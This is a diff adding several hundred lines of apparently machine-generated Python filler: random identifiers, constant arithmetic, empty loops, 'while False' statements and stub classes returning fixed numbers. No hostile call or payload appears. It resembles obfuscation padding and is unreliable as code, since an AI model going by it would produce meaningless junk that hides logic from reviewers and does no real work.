+IKCJJtrV_tP8YX3en={149:41685,106:41536}
+bUoYuKli_tqkNS4BY=(lambda _:_*73+64)
+class KVRbjiKb_MrYn1E5q:
+ def FwMlKqeN_WbAXw591(self):
+  return 17716
+while False:pass
+while False:pass
+for bHUynBTH_G5ugGHaq in []:pass
+qQdjdfXn_EJxZxtjh=[30597,8743,44470,41609,64637]
+while False:pass
+while False:pass
+narBRmpA_HOVMn01u={121:10728,134:10641}
+BwiptjRC_Jb2gZEEW=2840773791^2006536326
+class YEldNmEs_ZkLdhkrU:
+ def iMGEMCbv_SQqkuHqx(self):
+  return 27677
+yPqxLdDx_VK1mxHUt=(14451*14451&92)^14451
+gGACLWiz_UZehXTKr=(17931*17931&102)^17931
+for YAlajZPT_JbUxQuJ0 in []:pass
+if (50896^50896)==0:pLNfpcly_AsVJeXj8=51742^47544
+nzAiWqAN_8zQKfGVI=(9838*9838&202)^9838
+DKyQuLQI_wDyPBwOm=(60852*60852&180)^60852
+GgyUxYuS_FrAFlR5W={214:17343,41:17257}
+wFkTfehx_lJ3RS1Bq=2128853780*3509950425
+while False:pass
+QugzaTLc_d2lkvuxs=[34563,38665,24225,60981,24522]
+def JxSRPEeJ_QEc7ZPB8():
+ Ycyeyerv_zVb7SRdT=28429^13844
+ return 9732
+JlQWEMBe_kgP3PWrh={183:42622,72:42697}
+ihlXvBHs_FGgVZoLa=(lambda _:_*78+79)
+for uuLGMftA_pPSbkNML in []:pass
+mgnGUIWk_k8379f5U=(7115*7115&207)^7115
+for bEbEZuqN_te2a9lK0 in []:pass
+class fXepUbYU_ZJPbPb9w:
+ def GNWjWBNh_jm5KtUKg(self):
+  return 63000
+KIzZkjQL_bKGlOfzV=[36481,44892,45647]
+for KLtFaEPd_HYwL4GGu in []:pass
+if (53584^53584)==0:mTnROEse_i5kmYFoM=23269^4506
+fwYktdwf_ao6a03RS={4:42640,251:42644}
+while False:pass
+EIrglIym_0Wv19LzY=(lambda _:_*91+12)
+while False:pass
+class AsvOTRNc_678Pv6IL:
+ def abNWFowd_2kjJxcuX(self):
+  return 38194
+KHpzlQSx_yFWBXBcg=(49985*49985&74)^49985
+def rskBZddi_vT1zbmXt():
+ JRzIYsuh_tsvOsl5y=9817^40116
+ return 1040
+CocrsSfT_7kQJkjjK=(62479*62479&231)^62479
+yHyBSuvF_lHS6J1nH=(54314*54314&188)^54314
+dwPotTKF_yxZgjhxp=(45325*45325&70)^45325
+class DaZgxGDK_3kw17A5y:
+ def itlDpVwX_sRp9stR9(self):
+  return 14007
+while False:pass
+for FwjVidkz_hgFkomx6 in []:pass
+KFBKVdGB_KLCONwxn=1692246693-3127972032
+EBlKdHaQ_lFCdIVKC=1831506614*1285162315
+qRXAccWf_LcKpsO8w=(lambda _:_*40+44)
+def IlSjvFGw_EKg3wnrs():
+ edbxmsiF_hEzm9cDh=44026^50310
+ return 32898
+uluQsCna_6FhxyreL=515338762&1453850133
+if (43169^43169)==0:vLWFFsti_8ouwWheN=2837^63421
+ajixZeeW_XfTv4lOU=(lambda _:_*21+92)
+for fgfhIfIt_O8x14SNJ in []:pass
+def TbRWjvAN_PeLj33mH():
+ cSfUULqO_uM6xsXoW=16623^63824
+ return 16448
+if (35541^35541)==0:PlpPMThO_AXp21y3k=46718^42361
+class GrfmywsV_pOCHEAJm:
+ def gFoKVaTn_yLt1ejFg(self):
+  return 13350
+enZNBrqu_D3nAHxV4=3093334458-3608940108
+KXjHkHXB_1kN3Nerg=(57502*57502&123)^57502
+for PiUCPrIu_8oZi7Obc in []:pass
+while False:pass
+while False:pass
+QkTbZuhT_zEaIEQyi={75:37875,180:37816}
+for WtROzCGL_xLksTzau in []:pass
+class wqZGtYnH_rkHSx5eZ:
+ def qlfTPmyo_hEffX87X(self):
+  return 45714
+def MulYVvkq_46CwRoji():
+ mNvTiFnG_cGa7VWEG=12865^27271
+ return 8705
+VXviLUiS_XZGU0XpJ=2864231967|2426893847
+CdpaBNqp_eKIw0kDM=(46704*46704&119)^46704
+while False:pass
+def icbIXeKP_nqmzjqOg():
+ HVWvfzGc_BAzSgEhX=30905^30823
+ return 30753
+while False:pass
+for JVGriZhT_6MZOdDbr in []:pass
+svslrtae_6WfqhOfN=(7175*7175&156)^7175
+CmRsMQUG_rLytPYuT={180:18079,75:17963}
+while False:pass
+XVKrjChr_uRikxgih=741629743+3049373752
+lqVLxGpz_fs59hpX5={85:31621,170:31696}
+while False:pass
+if (53798^53798)==0:bmZuYhNx_qsyMFdjD=63227^26535
+def PbCPDDhk_ogjqRP6B():
+ zcXNkWPL_tYWfhYaP=35512^52658
+ return 34992
+HomiHJrD_jaiZO6dO=(lambda _:_*74+67)
+eaitFFAh_GDbJ2yQO=(4864*4864&55)^4864
+while False:pass
+naMYjCKT_hrZoIKsL=[10868,42747,5119,35798,30425,14437,60510]
+weQyBFkd_NoKAVhNd=[9294,24496,54136,25133,55386,29033]
+GQDNUpQc_2s4zU89v={69:40379,186:40446}
+def GqDSehFs_qQJi3Pa3():
+ CNibWiTv_VYWrj6lj=37669^7182
+ return 4100
+uvFtInbc_JEBcW68w=(lambda _:_*15+89)
+jYebtRKW_38EY819e=(38880*38880&129)^38880
+PZtgmFlx_Cpg6cIq1=[17386,33772,48277,49535,7641,22108,40081]
+GrbjhecX_9NclZe8i=572637895^902473403
+while False:pass
+MWzrjdUz_HQFQL9AY=[7419,43183,35613,60525,24124,28075,90]
+NCFyYfjZ_cl6yp02Y=(lambda _:_*59+61)
+PAXQIOkd_chOkZ5Fm=(19196*19196&179)^19196
+if (28055^28055)==0:QLIkjjPh_sa0r5qda=41625^64246
+nxIUAUrd_rexOcTcm=[27946,62211,23335,13117,54830]
+ZeuwxZwO_NIWV5tXM={186:7863,69:7693}
+gWxHGoql_Gmh7HMsG=[13567,42381,29904,16435,2980,35148,15454,7225]
+jqXVTkJz_xj4Dk687=[36350,28497,25115,64485,59000,54546,46764,47581]
+ngeYbNZH_ZXtUyxKR=2356002122&32946669
+ByMzmvZP_e4yXp24R={209:63203,46:63026}
+lWMygLTN_8PrVxTmp=[182,413,29534]
+IAITlVqR_GBDFrSES=3138529866+3072949063
+for RFuOYHLA_idU1XWtd in []:pass
+def MLWpexhq_wQN12t5x():
+ qjARojtj_luPcrnqq=23984^8242
+ return 48
+if (35524^35524)==0:JmNKNlFz_nk2EPUCy=14698^57214
+class hijScxHm_KlQ0jjUb:
+ def npqOzSnN_cI8d8E4R(self):
+  return 24562
+ORiAgluf_Yr4LTMso={63:20509,192:20514}
+gLgkQNfZ_Q29SX0SF=1728688562^2410135035
+uOwFcWhX_zGSSwk4B=(60854*60854&60)^60854
+if (7866^7866)==0:zuAdKDjn_DtJW6gf1=45734^1944
+for PKSIwuhd_FtqA7TRw in []:pass
+while False:pass
+bTfmBJqt_W01LPQAI=(42276*42276&13)^42276
+qVEpFcLp_acaDJaMl=(6732*6732&210)^6732
+for yxGjTsom_OIeRrRYv in []:pass
+itQEjtSs_VXbMgDdQ=(2871*2871&103)^2871
+while False:pass
+for ujdoSvdf_9wVPDlVl in []:pass
+NxOVNnmr_cAi0sqIZ=[5514,44481,37772,32817,56438,2207,14839,22557]
+class VHjiUEHt_ZP9T9tQI:
+ def eMJMHJOl_OnThsjwP(self):
+  return 8619
+class nQaoUNsR_sSvEL2Rh:
+ def cqUOUiiC_EZ7eQuj8(self):
+  return 44711
+if (8759^8759)==0:CTCOSQQD_NkMntGro=42779^41063
+def RTtkcZnF_Xizme1FL():
+ mlVoFCTf_A43bgVKp=51893^36429
+ return 35333
+while False:pass
+auBbbHAw_V6tOFmmh=3004563004^868305423
+for NTEStUaj_jg4bx4q9 in []:pass
+class lsmzZVKM_cwZB9Ebm:
+ def SsEnzNjH_fYPyco5L(self):
+  return 4214
+KxryqbZX_ivCu9iDJ={71:5424,184:5495}
+for TOUflvRk_8822WNw7 in []:pass
+LeDzffjh_eIw6M0ll=(30235*30235&86)^30235
+FYDiaGPr_JIQmRgID=[36326,56441,1624,5469,41231,50493]
+HbbKBlvp_jv169VXl=1417781841+2453447809
+WgDdmvPr_TRsgyd8G=1439666652|1357054333
+EFiKxFmS_vH6OWo81=(lambda _:_*20+92)
+xUvyIrth_rbJ3I7CK={122:28104,133:28082}
+jktStjMC_NGvvGwLC={28:21911,227:21899}
+IMJyMpyX_4sabZqEf=(47695*47695&226)^47695
+for klyVbUel_oWheruYn in []:pass
+bZlJyibr_hBDwDxXj=106371547*2662590940
+NWokDPjQ_KypKcGjS=(lambda _:_*52+8)
+UdzXaZVg_mdaIQKmZ=[26740,44749,56948,46044,50546,16660]
+if (53828^53828)==0:wurCDxkT_9PMrJB2X=23117^64735
+for SxZdcOMn_A5qCGuPK in []:pass
+vBVKcgMo_Fb4TKKdP=(lambda _:_*77+15)
+for DvRpYxYz_n3BagsDU in []:pass
+QlwefHRs_RKq8r6dh=(lambda _:_*13+47)
+class llBFseCA_lxZexWrq:
+ def GrGhsIVE_qrq4W2SR(self):
+  return 11680
+XkqfgDbK_xYx4PJL7=(lambda _:_*35+54)
+tjTYcqGO_23zrXaZu=636045653+1760045787
+while False:pass
+vkwanzRJ_2TPZkBrD=[49574,55243,27326,5105,28485]
+while False:pass
+zrykxOVx_z16gv3Gw={209:17072,46:16993}
+if (2387^2387)==0:oUbGCIJn_7OL9rpU1=7342^14735
+while False:pass
+rjJkJMFU_nTdSv5A1=[26445,53794,21552,14634,13098,49152,52358]
+while False:pass
+for yznXkAOr_ltRbxGv3 in []:pass
+class DgcwvZJP_0jlABtuA:
+ def nulZvLux_tSyRnCzL(self):
+  return 41937
+def IHpgEGAK_cri9TGA9():
+ QXDPkFiV_DJ7cW7bZ=38768^4022
+ return 1840
+DuivoVGB_vUNLEBXv={211:55185,44:55106}
+class tQSFRNEZ_GAj6YULN:
+ def LNxTesaJ_udCe2Csn(self):
+  return 1573
+class TBzlznaB_hdl4WRC8:
+ def khRMdlud_i2hFLh9V(self):
+  return 56270
+yIRrDhTo_AY8gW4yo=780368656-1291510652
+ETUbFklB_Jg6KjaFg=[36519,11704,15727,15791,34593,14863,12012]
+BlwVEHNo_LYWxp4Tr={245:49310,10:49259}
+MDqsCtOl_dcAheK3o=(62040*62040&196)^62040
+def lvApNrEI_nbQfBJr4():
+ LXfgqSVG_x7wTc5lQ=47216^53240
+ return 34928
+for DxeOtVRo_gP4xzkar in []:pass
+WkbbucdG_GQPvJglx=(lambda _:_*89+67)
+XRaFMllT_UaCZmutD=(64497*64497&34)^64497
+class ByaCvJYw_AqGyZj2X:
+ def McgWvcKj_xmBZlsH8(self):
+  return 55805
+for fxtHKVkW_ht1XY65a in []:pass
+while False:pass
+for rQKRqZBw_LiIddGgE in []:pass
+twxWNsEj_tgxv5Cle=(lambda _:_*95+28)
+NAEsLXMq_nuPsdlH8={66:51026,189:50960}
+if (48923^48923)==0:mBILtlJW_vzWATJe7=12588^29007
+rGzgLsyo_yDaoy7qU=(6759*6759&130)^6759
+for IMDPeRAu_t4k37jn5 in []:pass
+nNUMxcaI_2Olp6IKj=(41880*41880&195)^41880
+for TCkhBxPr_oSTNk31X in []:pass
+JwVZmFGS_7WOymf7w=2327588788^2516469699
+if (15313^15313)==0:EjEhlvHP_KFKtyqHV=53108^21692
+def SPWQEOWk_wEXrA20D():
+ CudGgHRT_12KaEc6A=54388^22864
+ return 20560
+xGvOftmm_VvAGTmPu=(13937*13937&123)^13937
+if (6761^6761)==0:rTxsSWWw_1jb2LNOS=54159^16397
+class EDUwZHVR_evviXt5v:
+ def EszFGOHw_MQOL5bSf(self):
+  return 17182
+LxeVcaDU_GWJKyPSP=(21616*21616&246)^21616
+class NTtNepeI_kR2WWWzV:
+ def FCLgwRsp_WEygyBYI(self):
+  return 31569
+nkWpCHgP_R4Qag9T2=(lambda _:_*55+16)
+rJBNESbV_f9OygatP=(lambda _:_*32+86)
+for iJjuyBfP_c6Z3pHeZ in []:pass
+bSEiCYzF_0i2x8hCq=441579837|1655074734
+while False:pass
+GRPWXujP_W5TBMBIp=[44173,5546,7329,54158,52226,61138]
+EBFZebMN_ZYYgt2sf=[8140,41036,57193,41387,6208,44654,28269]
+class echZzEkE_2jysEJWQ:
+ def DwZHXiNi_aO9M2Rai(self):
+  return 1712
+oHaeBDbK_NITzginS=(lambda _:_*94+81)
+if (40693^40693)==0:ImWLpKDA_oRePEn9g=59767^7526
+dhyleuld_cKemYKRJ=3640292873+542490571
+jimnJLTS_gllVMsiL=(45302*45302&200)^45302
+def YXSKVeIU_cOl0RXHA():
+ XiUXMckz_xUQT636O=51516^56123
+ return 51512
+class HcvoLFEI_3Kz3S5km:
+ def XZGLdkIh_DsmoTPmB(self):
+  return 63188
+while False:pass
+while False:pass
+while False:pass
+LmgLZajH_vt6RLyM4={115:63460,140:63383}
+vCRvhmcp_cu4AIxDY=[20661,4528,49579,22991]
+if (48^48)==0:RElXHiWy_rB2SLn81=40765^37779
+NoAhgrKm_gRhCOchx=(42311*42311&120)^42311
+zrmlHplo_ft95ZfRB=[35974,5788,47254,18360,25777,62318,18885,27555]
+for bCDwijCh_0BC2Qva6 in []:pass
+gOgYCZzp_pyk31Xat=1430116964|1360592432
+nBbmogmr_36a5KH0U=2771408823-3269479551
+BtZBuMjl_kAFbd0WO=2620679752-36954398
+hVzYLLTv_DZgrgTYR=(lambda _:_*10+36)
+yISntzsa_GuehvgpF=2352405994^2350462888
+RwDucujz_IdJYunYM=(lambda _:_*88+92)
+class GUPGQsjc_xOEyr0Nf:
+ def RhWnWMrK_ORPGHMoJ(self):
+  return 9352
+class TyddzaDe_BJI01Ylw:
+ def QnueMpCG_gmE3xljE(self):
+  return 41608
+while False:pass
+FwnVtmKN_X5r9aQ4z=1040083355-2145809604
+AIteJYlu_LvcebOim=(2827*2827&62)^2827
+class ezaaPaEG_w5G8Pwny:
+ def NCzktKcO_4WlnWApu(self):
+  return 38224
+while False:pass
+for iwMKNDOc_pctwXqYo in []:pass
+if (29421^29421)==0:XSNsvKqR_C5R51KBV=52849^20486
+def dnXQVZeH_jAw1102I():
+ wlGRuVOb_eY0afl3x=59348^36698
+ return 34640
+PyjANKUy_xw1Fbtpr=[29879,13011,9475,24195,27859,37507,32926]
+dDaJBQDS_t0uVCoIi=(lambda _:_*80+69)
+class uBNyNAUm_eeyXVLVs:
+ def qeoVQSUu_1I0nJEny(self):
+  return 7473
+for sBYheFbX_x3AqSb1W in []:pass
+vrHnLZNv_qI2HAfMd=4002310217^3641106813
+wWQqJKre_kohzmXlr=759380651^1445961477
+cZmldUSk_8PnOsJBI={140:27830,115:27706}
+if (37402^37402)==0:DDKouKSE_IvVUk9Gy=59335^43893
+while False:pass
+iOZVwBac_lF8Vlbhs=(lambda _:_*14+95)
+while False:pass
+WKPULTUD_PsJd5lm1=(19033*19033&113)^19033
+yTRYBvvN_WxFYp6XC=[59008,33632,16146,33837,30512,23461,55403,8364]
+CTJMtYUC_toAJzbLY=(lambda _:_*70+35)
+class NivrsTch_BtJPlHAF:
+ def nbXSPAhY_I11kTsFQ(self):
+  return 60329
+for McqmAEeY_7JxIFb9P in []:pass
+wSqRWfkt_AF1NsC5B={136:40079,119:39943}
+MmEGhJtA_3w3iOqsa=(37977*37977&22)^37977
+lTgANksC_LbxKUqf6=1886359885|4262962281
+jncyWuya_0ZNdc0aQ={155:65315,100:65464}
+class bAjppADr_F7wOLuck:
+ def wFcqhMRq_oEq39Wq6(self):
+  return 35847
+FSJJkaiL_716LlxKj=[25594,59621,61712,6102,21286,53707]
+def rsSZkyMx_xcAuWPw6():
+ ggvlUGIp_KuMvL4Ni=47752^37430
+ return 37376
+for IBaoRMgq_ZKhuLEre in []:pass
+EYJOxdfQ_1E8fj2C8={49:1460,206:1413}
+vfAthoHQ_pYAN68Aa=(29741*29741&193)^29741
+for yrxVJUEu_4Ef3TkIb in []:pass
+for PzqHjiWj_mOLkDbGJ in []:pass
+qclDdDfg_5eXqQyLr=(lambda _:_*49+8)
+DwYEZVqD_IS4mbohm=(25096*25096&156)^25096
+KQGETNPB_68ZqlcPD={68:40278,187:40210}
+for uzalXGDW_RUelQUgB in []:pass
+for qrgeBsye_TourfZtt in []:pass
+iihjDEim_5HzsGcOV=(lambda _:_*68+33)
+dRHddwrH_C7uLuQOp={218:43026,37:43208}
+class oIsNWowG_iHD6OFKX:
+ def sLBwIrby_SxDjrwVH(self):
+  return 62506
+for xSYvOXZT_89UM96Or in []:pass
+yByiSSaH_rqTm13ZN=(4974*4974&250)^4974
+oaITxlfD_WiUWcSC8={156:27678,99:27778}
+IRktaDtq_jZCbNjyM=[5228,16901,31878,34205,44413,31810,52691,25318]
+while False:pass
+dFwCAeyH_xA23D9Yn=2257414649|3003043316
+Dyjgshhb_6Vbf8mE2=[31885,33407,12409,32601]
+ZYQzQmKc_aymx9lkg=274128474-3019883062
+CIFjetHA_gySKSgmb=(46260*46260&48)^46260
+WTkhfoZd_GjirHEoM={166:22307,89:22405}
+while False:pass
+if (63487^63487)==0:evuUtwXk_m3DHYwoW=46129^63497
+BBlHQPbo_kgAnNpLq={232:51906,23:51754}
+class WKzVmwfQ_48dTHRbf:
+ def pbYLUDfY_3VeJYHVw(self):
+  return 13745
+vJSsEcZa_6IFEWpAA=2089081115+3331862285
+RSxJjdsR_hpHgKdYj=3200804905-836707357
+while False:pass
+while False:pass
+BcYPmXoG_O6qasWOm=(lambda _:_*1+88)
+class GFkKfRog_xxrejVtA:
+ def YiJjHgzD_pGwZePjd(self):
+  return 6293
+for gPJAEEmC_Mojp4lt9 in []:pass
+MSGcQJne_Uw4GPT6N=2164375383^2496549769
+if (24143^24143)==0:aaDehQfQ_4cc2bSBQ=57056^640
+WXCWKIlV_im5adZJL=(41063*41063&12)^41063
+if (19802^19802)==0:sjuUVurC_de7wsGsu=64878^4144
+qOdKFDro_AKR7Dgpi=338292323&3113334574
+fHrxXVIN_2ISq14MA=2166503427-3810804373
+while False:pass
+DWbhjnDb_cZcOoCyR=[27208,16277,25100,50526]
+for BVMqxoqQ_IphSt6Eg in []:pass
+sSQUPYZw_R1NbGyXn=(lambda _:_*18+93)
+for sdoAuYJK_NehmY0T1 in []:pass
+eBIIhwhC_Mv75wUR3={67:17856,188:17795}
+def gmBePVvl_8hAY8Ra2():
+ FXuYeUAu_JHDzo2T6=15945^11390
+ return 11336
+AUudlQlw_YQ7Y4Dra=[51269,12657,9130,30769,16337,15579]
+while False:pass
+wqxXlgjJ_znflvawd=[61293,2361,38254]
+def jSjpDotU_E7kDuWec():
+ TOlXpvgb_5yLtP7ys=13929^41688
+ return 8776
+johPQtvN_o1JJxl98=[38064,56899,61725,56547]
+if (57687^57687)==0:JLZaTJSr_CHNiXrOh=65404^64978
+oqDtOnSo_Qo7LlrrN={143:51594,112:51461}
+zxRjPRpO_QQb3vM8g={199:57081,56:56894}
+jBgiDQrC_SUwqv4q4=(lambda _:_*34+89)
+BeYkAMqa_hvXvNUEr={186:4107,69:4273}
+while False:pass
+VqYeZJMF_U1WnzG4c=(lambda _:_*21+91)
+hprQAXHS_yTav26ms=2220659135^3675377281
+for errXxJKJ_rgRdYWYE in []:pass
+wVVlKKMd_0yGeSfe1={173:41819,82:41974}
+def hrPcIwsY_iXafdhvq():
+ miCtCDPR_nqXWPK76=14686^40849
+ return 6416
+zyLeasDB_l47AXzbY=2868330498|472944176
+while False:pass
+MENQXqZi_uGCygamw=(lambda _:_*12+85)
+KqxvyRpi_yC1tTMvl=(3053*3053&161)^3053
+WYngcVSH_TBjhWxUl=(lambda _:_*55+15)
+while False:pass
+cOkbucVb_LTnYv23V=(lambda _:_*96+48)
+HIhQBeTZ_Rl5SVhx2=(lambda _:_*17+84)
+while False:pass
+for eBBTHYZL_PMIsCw9r in []:pass
+for qRPXXyap_po0m3Iv1 in []:pass
+for yfzZPXwe_UdCojtrc in []:pass
+uxjWvrBh_D2jnoeCB=(56819*56819&211)^56819
+for YJhUEgms_N3YDdgFC in []:pass
+for UDjuhTBD_qzzgJbOr in []:pass
+jFlyWNdu_4ex9zotA=[57545,30923,3650,42271,33162]
+for WyOxljvM_JfR3ytaY in []:pass
+jbhcKMXw_uMH8l5Xy=3324617570+1599220483
+nmjXbooa_lLfrKnlM=1378698909-1222708009
+LmwFmZgt_7KJFSjRz=(64352*64352&95)^64352
+if (56662^56662)==0:BmQbfvox_QT2h5csl=29775^47776
+while False:pass
+for hFnPVxdv_j1WcCSwC in []:pass
+hvEZXwHn_JPaoWKgn={85:65116,170:65033}
+caOAvhMq_zzyQKujJ=(53616*53616&72)^53616
+UiJYMFnD_gLBUVlxm=(lambda _:_*36+53)
+Liepmhee_4GV1EN6g=(52513*52513&65)^52513
+def ZBTpPulM_L5SeREVr():
+ ETVuBQpD_mPJQUIJf=58555^53040
+ return 50224
+pXzWpPHU_1IgIWo7m={241:50865,14:50752}
+HEVWEdYZ_h4qlcz3f=976688202&1678859818
+for mJCBPgFq_UwEv4KBf in []:pass
+sNFIidsc_Ub1OgokZ=3820314015|2639717956
+class BAxhahPU_wVY1XrRZ:
+ def ShOKKFhR_K9v4k0bV(self):
+  return 64166
+HSJzKwQT_rAud8e2P=(23933*23933&199)^23933
+BlCEtzwf_jUYoxvgC={109:26062,146:26019}
+class xUgFtOtD_WA4ffaVE:
+ def pkFIyvcr_s5JbuTAU(self):
+  return 41372
+XLsRLGqu_dfXsSJKO=3015109553&3696098426
+if (57320^57320)==0:fCLjoSKs_4g84QKBf=7893^38088
+while False:pass
+Jrsywsmk_dePyQTN5=(62426*62426&134)^62426
+for FXMExknZ_ecMYOzQf in []:pass
+bNGtvTpk_dOIwKu3j=(5530*5530&83)^5530
+if (25275^25275)==0:YJTmXVLR_0HvvArwW=44358^55945
+class JOTyBTqL_LnH9KX0T:
+ def XiOwEvJx_4yiWWLcU(self):
+  return 8940
+def OGMQZeiW_bVQ8RSmd():
+ cdmiJCae_zmGTykRm=58783^30238
+ return 25630
+dyZyGdEH_yjhkk1OM=3800277462+1033122635
+class TFranxWg_rrG9gqB7:
+ def IKlnZIdM_6y1BFb7k(self):
+  return 42585
+class mLQQgdpW_LCPrQSji:
+ def pcnjQmMv_TIgvFwyl(self):
+  return 23821
+if (58285^58285)==0:WimlnsCY_N3T829cU=18145^44792
+LsHinQqi_kySkrhYj=901555211*2724250110
+YyooiKgV_OPlBmiM5=(41044*41044&32)^41044
+kMsQiQOf_xRiLnkNn=(32605*32605&252)^32605
+jojdVOok_0FDLeYsC=(39928*39928&169)^39928
+if (1244^1244)==0:BqOdRCRI_MbdXS5CS=150^31043
+for INRkhveL_f8mBLU8S in []:pass
+def DWMEbIzG_cBmJ7EbD():
+ DchvFbLp_K525xBsn=42021^38433
+ return 33825
+xMQHFgyT_1ViYe2hT={232:20531,23:20699}
+for zhnRgMKN_mdtGPA5F in []:pass
+PoyVjFEn_FElFuVdf=[25061,41714,28959,32222,45067,6951]
+if (35236^35236)==0:tqCJlHKv_V6wiwzSZ=53891^41994
+FzTAduDt_CF4Z12eQ=(27080*27080&88)^27080
+LlpjahrZ_uu06odpT=89877915&2614523758
+while False:pass
+RZoCwYLK_45jEsD1Q=(38090*38090&230)^38090
+XYiRpczS_pwAqfxfm={15:11727,240:11712}
+for sFYRhXPc_SfpbhcNL in []:pass
+class QyjcVqtH_XuMSyHU3:
+ def BvreJufi_NDP9tkUz(self):
+  return 8002
+zCXZRDbF_UNkZNS4l=[22360,9667,20214]
+for IZfQxSda_bmjadhFK in []:pass
+while False:pass
+for thrsVsZK_afRZe71x in []:pass
+while False:pass
+erriVbxY_Cywmmni2=(44034*44034&127)^44034
+tKEBWNoS_5rJwI19y=[50480,22213,47197,52433]
+GXGJfbWM_mjvZKXV7=[12852,1307,27030,17288]
+EZBINXgp_zZP4s17G=3880567162|1373753361
+for TyMmnxhq_402BQAR7 in []:pass
+class NrPqnNyw_4BR9LENR:
+ def eVyxHPkn_hzPPtJz5(self):
+  return 20177
+if (28950^28950)==0:UObIKbiP_iIdbKNAM=53136^20383
+yBJZIAdq_SXVAzUQ8=[27569,18876,48683,3915,30377,38328,63185]
+gvPbqEng_JuRnF5r5=[43361,47234,62132,35005,29400]
+while False:pass
+while False:pass
+RhVvuRav_rDoDXctb=[16092,33595,27561,59022,6808,57491,64035]
+GMMQSllY_4VR8XXbP=763819788+1270464282
+if (63017^63017)==0:SXkXAjEH_55BTewTm=43601^41908
+bEtpcRZl_bAoF1Lhd=(lambda _:_*75+28)
+while False:pass
+while False:pass
+QqZXqXJs_3qshRYdS=[9648,32396,42469,2685,18469,15898,7168]
+for SoLlJiiN_XQ38yzk5 in []:pass
+uMBMZqRc_FeXTcnBG=[61331,17610,61243,12427,27155]
+QBhXUppF_NRXIuM0i={99:60654,156:60557}
+for UwRFuPoH_9LG1UNPa in []:pass
+gNUBrmrp_s0081uzl=1512316474&2097348534
+if (10939^10939)==0:MdxtsFxd_27Y7GIha=17212^11143
+bwrgajuz_GMrLJ8CZ=2437787708-451311140
+def UTeUuQoO_VJZVJ9Uh():
+ zihKpPyF_iAKTWU9R=60046^53266
+ return 49154
+LomJMgOv_FMPs5pfI=2590430317|3447091981
+if (41365^41365)==0:pjxOodCM_Out5rcTf=11990^47827
+for QdDAbULT_MIbsLMQ7 in []:pass
+mvqDIYav_LoOn4KxH=[4168,13257,57053,61410,18325,17635,45877,2554]
+CaqGkENp_DPl0U5QJ=3793743193+2715441725
+UxDtsNgf_m861WflM=(lambda _:_*66+72)
+gPBSQVfc_MT3hAfgh=[24124,49693,54926,35696,48936,19795,23259]
+KboysTJs_ZXNJSLXi=[41336,27115,62243,33209]
+wlJRatgR_5MUhVpLK={54:51235,201:51221}
+TDdOoWZd_xQpZRQud=[7057,33913,13207,54129,11869,32452,1410,59292]
+XCOhVXVC_tjMbpZYO=(60029*60029&132)^60029
+uPuyIigM_0VlYRBaC=(lambda _:_*68+47)
+class HripFWTp_tvihNtFK:
+ def ONRtCKzL_cylunk3E(self):
+  return 49673
+mXNsATyl_It11ccBl=2110919554|409825560
+if (13580^13580)==0:iJcvnkGF_dz7tIOt6=15152^29204
+for jifpNtKp_wL8WLtsu in []:pass
+PghrLqdX_d4SHQzKc=[44712,58195,45399,15938]
+for jVwZKGBn_sCCTiW1I in []:pass
+BelTliMf_XM3tLTAe=(lambda _:_*6+100)
+gZxDkCDl_5daWoETG={144:14389,111:14501}
+def GrqCzdoA_f9POzKqS():
+ cXmmYEnT_8V52gQLN=1769^34319
+ return 1545
+QNahUmwB_ql0SXyxd=383418639&287693950
+for pNYNeFlO_O4bYf011 in []:pass
+if (10042^10042)==0:AlopuMRd_pMdeNsLy=59527^50403
+VElLrLVd_KnbyDciI=(lambda _:_*61+91)
+dtKcDoAH_rfoicUFt=683658116^1319659317
+VFuPiTEh_Lrkl8Z16={119:41500,136:41579}
+def qlhDkYDt_7DiVrJuM():
+ IKiBLtmf_2YecmOoM=12111^32714
+ return 12106
+xEKSgRKI_Eh7aaqt4={250:14867,5:15081}
+hzAUasEw_PQomtmFG=(46301*46301&25)^46301
+KLuGaiAE_HFgncG5P={147:2457,108:2314}
+OxTzmDhQ_1IEQAGPb=3363193549^4280167061
+def xYDHaOWo_bsClUAKk():
+ JDUpncah_0bW72HZ2=56248^27275
+ return 19080
+TeUmpbOM_KhuWFHmZ=2987745888^2382605628
+lazTscTu_9DtFgPVk=(28200*28200&194)^28200
+LLkneyGw_3JJPzARa={122:24396,133:24374}
+qFLbXvqA_Awtr4aDU=(lambda _:_*32+63)
+pfNYIaPF_PkeyFl3e={42:60895,213:60917}
+waGVqsQk_oVDWp6pn=(lambda _:_*58+46)
+FxrCVQOy_KiZSDjk2=(44291*44291&187)^44291
+uoXqgsbv_vE5hQ1zp=(13186*13186&78)^13186
+uwngAFLe_RqHKsMju=[43176,28519,33803,22163,20536]
+while False:pass
+def UzPqRjLl_uAXy2o5d():
+ tNLuXrLZ_9IaZ6kIK=41340^57377
+ return 40992
+tRmcvHDR_wFt2xItt=[25482,62228,44391]
+PWZofyTl_7QjRXY3Y=3219782776-3472350761
+class gUMWYaIG_qwfnwERE:
+ def HPXTYVOu_CoPSyRev(self):
+  return 4779
+FSfLHIXJ_i2qjySuh=1482624574+3597637472
+for UWhjQRFN_FkCygzMx in []:pass
+JSwMwupw_KrThb7f7=851669825&2512820133
+ymYxTxBz_Pfhpe2Jf=336034471|2087098239
+YEJKhnCq_k5vwvxxZ=(22706*22706&45)^22706
+eqZnAcsA_Iav3pOA2=1946646834&2393285542
+XElXnYYt_LTH4GkaM=[41427,13040,12932,47817,16917,39695,53413,39730]
+while False:pass
+xyxFdQyx_PYb6LQKi=(lambda _:_*4+24)
+aHKehOZe_BLkdL8ue={198:53531,57:53725}
+PAdmQywN_whqsaW01={40:24366,215:24326}
+gDHAYzDP_CwfcWi1r={78:7681,177:7759}
+RpNkyaII_Q8VX3TSm=(12646*12646&109)^12646
+KSXLOnLN_55HsfKOd=[62338,304,63398,38502,15521,35926,2989]
+while False:pass
+kEkOPGHe_FATSpJv7={87:19157,168:19074}
+def bDPpdFdq_P1j2gF6E():
+ dfrAQTTb_2Yr397VK=36402^21334
+ return 530
+rYYWrPsg_5U4USRMi=4107389543*1179080096
+nThXDwum_YLWaDOyQ=[23307,45896,52247]
+VusjUtmY_0YxNlYRo={132:56542,123:56410}
+if (50821^50821)==0:SPaMTxyB_boHMBOG0=33124^10099
+EfVOBYwa_DyqGatp0={134:33061,121:33187}
+while False:pass
+while False:pass
+class RWFYXMTm_cVhSsklS:
+ def UCGUsVeW_M9oIIwBt(self):
+  return 30188
+def cNzzqZRj_JD52ddDs():
+ UKUEfkel_Ak7nSduf=61437^54498
+ return 50400
+def cQQbDGri_DH01mA0Z():
+ RCFwCEBC_8tGWzzew=56205^49237
+ return 49157
